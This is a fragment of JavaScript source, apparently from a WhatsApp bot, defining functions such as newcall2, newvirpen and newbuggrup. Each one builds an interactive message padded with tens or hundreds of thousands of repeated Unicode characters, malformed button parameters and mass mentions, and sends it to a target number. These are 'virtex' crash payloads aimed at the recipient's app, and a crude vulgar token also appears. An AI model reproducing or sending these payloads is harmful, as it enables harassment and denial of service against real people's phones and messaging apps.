                ...
                interactiveMessage: {
                    ...
                    nativeFlowMessage: {
                        buttons: [
                            ...
                            {
                                name: 'cta_url',
                                buttonParamsJson: "{ display_text : 'Aanz  MODS WHATSAPP', url : '', merchant_url : '' }"
                            }
                        ]
                    }
                }
...
async function newcall2(target) {
    let virtex = "Aanz 🔐" + "𑜦".repeat(40000);
                ...
                interactiveMessage: {
                    ...
                    nativeFlowMessage: {
                        buttons: [
                            ...
                            {
                                name: "single_select",
                                buttonParamsJson: `{"title":"Aanz Aanz 🔐  ◄${"᬴".repeat(60000)}","sections":[{"title":"# Aanz Aanz 🔐","rows":[]}]}`
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"Aanz\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}`
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "{}"
                        ...
                        messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # Aanz \",\"body\":\"Zcoder Crash\"}"
                    }
                }
            }
        }
...
async function newvirpen(target) {
    let virtex = "Aanz" + "ꦾ".repeat(50000);
        ...
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "Aanz" + "@zcoder9".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Aanz " }]
                    }
                }
            }
        }
...
async function newbuggrup(target) {
    ...
    await anggazyy.sendMessage(target, { text: "Aanz Aanz 🔐" }, { quoted: bugquoted });
}
